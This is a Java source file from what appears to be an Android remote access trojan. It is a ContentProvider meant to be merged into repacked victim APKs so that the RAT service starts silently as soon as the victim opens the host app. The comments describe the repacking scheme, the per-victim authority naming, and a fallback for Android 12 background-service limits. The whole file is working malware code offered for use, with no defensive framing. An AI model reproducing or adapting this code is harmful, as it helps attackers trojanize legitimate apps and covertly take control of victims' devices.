package com.darkbiit.rat;

import android.content.ContentProvider;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;

/**
 * Bootstraps the RAT service when the host app's process starts.
 *
 * A repacked victim APK has no launcher entry of its own for the payload, so
 * the service would never be started. A ContentProvider solves this: the
 * system instantiates every declared provider before the Application object
 * and before any activity runs, which means the RAT starts as soon as the
 * victim app is opened.
 *
 * The provider does nothing else: all queries return null / an empty cursor.
 * It exists purely for its side effect.
 *
 * The authority is unique per host app (the repacker sets it to
 * "<victim package>.ratprovider") so it cannot collide with another
 * provider in the merged manifest.
 */
public class RatProvider extends ContentProvider {

    public static final String AUTHORITY_SUFFIX = ".ratprovider";

    @Override
    public boolean onCreate() {
        Context ctx = getContext();
        if (ctx != null) {
            startService(ctx);
        }
        return true;
    }

    private void startService(Context ctx) {
        try {
            Intent svc = new Intent(ctx, RatService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                ctx.startForegroundService(svc);
            } else {
                ctx.startService(svc);
            }
            RatLog.i("service started from provider");
        } catch (Throwable t) {
            // Android 12+ can refuse a foreground-service start from the
            // background; fall back to a plain start and let the service
            // call startForeground() when it can.
            try {
                ctx.startService(new Intent(ctx, RatService.class));
                RatLog.i("service started from provider (fallback)");
            } catch (Throwable t2) {
                RatLog.w("could not start service: " + t2.getMessage());
            }
        }
    }

    @Override
    public Cursor query(Uri uri, String[] projection, String selection,
                        String[] selectionArgs, String sortOrder) {
        return null;
    }

    @Override
    public String getType(Uri uri) {
        return null;
    }

    @Override
    public Uri insert(Uri uri, ContentValues values) {
        return null;
    }

    @Override
    public int delete(Uri uri, String selection, String[] selectionArgs) {
        return 0;
    }

    @Override
    public int update(Uri uri, ContentValues values, String selection, String[] selectionArgs) {
        return 0;
    }
}
